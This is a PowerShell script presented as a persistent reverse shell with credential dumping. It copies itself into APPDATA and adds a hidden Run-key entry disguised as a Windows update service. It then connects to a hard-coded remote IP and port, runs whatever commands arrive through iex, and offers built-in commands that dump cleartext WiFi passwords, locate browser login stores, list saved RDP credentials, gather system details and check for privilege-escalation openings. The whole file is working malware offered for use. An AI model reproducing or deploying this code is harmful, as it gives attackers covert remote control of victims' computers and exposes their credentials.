# reverse_shell.ps1 - Advanced persistent reverse shell with credential dumping
$serverIP = "147.185.221.31"  # ← UPDATE WITH YOUR ARCH IP
$serverPort = 47034
$reconnectDelay = 15  # Seconds to wait before reconnecting
$localPayloadPath = "$env:APPDATA\Microsoft\Windows\reverse_shell.ps1"

# Ensure the script persists itself
if (-not (Test-Path $localPayloadPath)) {
    Copy-Item $MyInvocation.MyCommand.Definition $localPayloadPath
}

# Add to startup if not already present
$startupRegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsUpdateService"
if (-not (Get-ItemProperty -Path $startupRegPath -Name $regName -ErrorAction SilentlyContinue)) {
    Set-ItemProperty -Path $startupRegPath -Name $regName -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPayloadPath`""
}

function Get-SystemInfo {
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    return "SYSINFO:$hostname|$username|$os|Admin:$isAdmin"
}

function Invoke-WifiDump {
    # Extract WiFi passwords using netsh
    $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
    
    $results = @()
    foreach ($profile in $wifiProfiles) {
        $profileInfo = netsh wlan show profile name="$profile" key=clear
        $password = ($profileInfo | Select-String "Key Content") -replace "Key Content", "" -replace ":", "" -replace " ", ""
        
        if ($password) {
            $results += "WiFi: $profile | Password: $password"
        }
    }
    
    return $results -join "`n"
}

function Invoke-BrowserCredDump {
    # Attempt to extract browser credentials
    $results = @()
    
    # Chrome credentials
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (Test-Path $chromePath) {
        $results += "Chrome credentials found at: $chromePath"
    }
    
    # Firefox credentials
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxPath) {
        $profiles = Get-ChildItem $firefoxPath -Directory | Where-Object { $_.Name -match "default" }
        foreach ($profile in $profiles) {
            $loginFile = Join-Path $profile.FullName "logins.json"
            $keyFile = Join-Path $profile.FullName "key4.db"
            if (Test-Path $loginFile) { $results += "Firefox logins found: $loginFile" }
            if (Test-Path $keyFile) { $results += "Firefox key file found: $keyFile" }
        }
    }
    
    # Edge credentials
    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    if (Test-Path $edgePath) {
        $results += "Edge credentials found at: $edgePath"
    }
    
    if (-not $results) { return "No browser credentials found" }
    return $results -join "`n"
}

function Invoke-CredentialDump {
    # Comprehensive credential dumping
    $results = @()
    
    # Recent run commands
    $recentCommands = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -ErrorAction SilentlyContinue
    if ($recentCommands) {
        $results += "Recent commands: " + ($recentCommands.PSObject.Properties | Where-Object { $_.Name -ne "PSPath" -and $_.Name -ne "PSParentPath" -and $_.Name -ne "PSChildName" -and $_.Name -ne "PSDrive" -and $_.Name -ne "PSProvider" } | ForEach-Object { $_.Name + "=" + $_.Value }) -join ", "
    }
    
    # Saved RDP credentials
    $rdpCredentials = cmdkey /list
    if ($rdpCredentials) {
        $results += "RDP credentials: `n" + ($rdpCredentials -join "`n")
    }
    
    # Browser history (simplified)
    $browserHistory = @()
    try {
        # Chrome history
        $chromeHistoryPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
        if (Test-Path $chromeHistoryPath) {
            $browserHistory += "Chrome history available"
        }
    } catch {}
    
    if ($browserHistory) {
        $results += "Browser history: `n" + ($browserHistory -join "`n")
    }
    
    if (-not $results) { return "No additional credentials found" }
    return $results -join "`n`n"
}

function Invoke-SystemRecon {
    # System reconnaissance
    $results = @()
    
    # Network information
    $ipConfig = ipconfig /all
    $results += "Network information: `n$ipConfig"
    
    # Running processes
    $processes = tasklist
    $results += "Running processes: `n$processes"
    
    # Installed software
    $software = Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object { $_.DisplayName } | Select-Object DisplayName, DisplayVersion
    $results += "Installed software: `n$($software | Out-String)"
    
    return $results -join "`n`n"
}

function Invoke-PrivEscCheck {
    # Basic privilege escalation checks
    $results = @()
    
    # Check for unquoted service paths
    $services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -like "* *" -and $_.PathName -notlike '"*"' }
    if ($services) {
        $results += "Unquoted service paths found: `n$($services | Select-Object Name, PathName | Out-String)"
    }
    
    # Check for always install elevated
    $alwaysInstallElevated = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue) -or
                            (Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue)
    if ($alwaysInstallElevated) {
        $results += "AlwaysInstallElevated is enabled"
    }
    
    # Check for vulnerable services
    $vulnServices = Get-WmiObject -Class Win32_Service | Where-Object { $_.StartName -eq "LocalSystem" -and $_.PathName -like "*.exe*" }
    if ($vulnServices) {
        $results += "Services running as SYSTEM: `n$($vulnServices | Select-Object Name, PathName | Out-String)"
    }
    
    if (-not $results) { return "No obvious privilege escalation vectors found" }
    return $results -join "`n`n"
}

# Main persistent loop (NEVER EXITS)
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient
        $client.Connect($serverIP, $serverPort)
        
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        $reader = New-Object System.IO.StreamReader($stream)
        
        # Send system info
        $writer.WriteLine((Get-SystemInfo))
        
        # Command execution loop (NEVER EXITS ON ERROR)
        while ($true) {
            try {
                $command = $reader.ReadLine()
                if (-not $command) { break }  # Server closed connection
                
                if ($command -eq "exit") { break }
                
                # Handle special commands
                if ($command -eq "!wifi") {
                    $result = Invoke-WifiDump
                    $writer.Write($result)
                }
                elseif ($command -eq "!browsers") {
                    $result = Invoke-BrowserCredDump
                    $writer.Write($result)
                }
                elseif ($command -eq "!creds") {
                    $result = Invoke-CredentialDump
                    $writer.Write($result)
                }
                elseif ($command -eq "!recon") {
                    $result = Invoke-SystemRecon
                    $writer.Write($result)
                }
                elseif ($command -eq "!privesc") {
                    $result = Invoke-PrivEscCheck
                    $writer.Write($result)
                }
                else {
                    # Execute regular command (NEVER FAILS THE CONNECTION)
                    try {
                        $result = iex $command 2>&1 | Out-String
                    }
                    catch {
                        $result = "ERROR: $($_.Exception.Message)`n"
                    }
                    $writer.Write($result)
                }
            }
            catch {
                # Send error but KEEP CONNECTION ALIVE
                $errorOutput = "ERROR: $($_.Exception.Message)`n"
                $writer.Write($errorOutput)
            }
        }
    }
    catch {
        # Connection failed, but we'll retry
    }
    finally {
        if ($client) { $client.Close() }
    }
    
    # Wait before reconnecting
    Start-Sleep -Seconds $reconnectDelay
}
